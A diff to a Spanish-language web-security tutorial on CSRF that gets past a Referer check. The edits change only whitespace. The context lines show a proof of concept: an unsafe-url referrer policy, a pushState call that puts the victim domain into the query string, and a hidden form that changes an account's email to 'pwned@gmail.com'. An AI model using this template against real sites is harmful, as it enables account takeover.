@@ -153,6 +153,7 @@ Referer: https://atacante-web.com/?vulnerable-web.com
 **Referrer-Policy**
 - Muchos navegadores ahora eliminan la cadena de consulta del encabezado Referrer de forma predeterminada como medida de seguridad. Para anular este comportamiento y asegurarnos de que la URL completa se incluya en la solicitud.
 - Tenemos que añadir en el encabezado "Referrer-Policy: unsafe-url"
+
 ```html
 <meta name="referrer" content="unsafe-url" />
 ```
@@ -164,8 +165,7 @@ Referer: https://atacante-web.com/?vulnerable-web.com
    </head>
    <body>
       <script>
-         history.pushState("", "", "/?vulnerable-web.com")
-             
+         history.pushState("", "", "/?vulnerable-web.com")  
       </script>
       <form action="https://vulnerable-web.com/email/change" method="POST">
          <input type="hidden" name="email" value="pwned@gmail.com" />
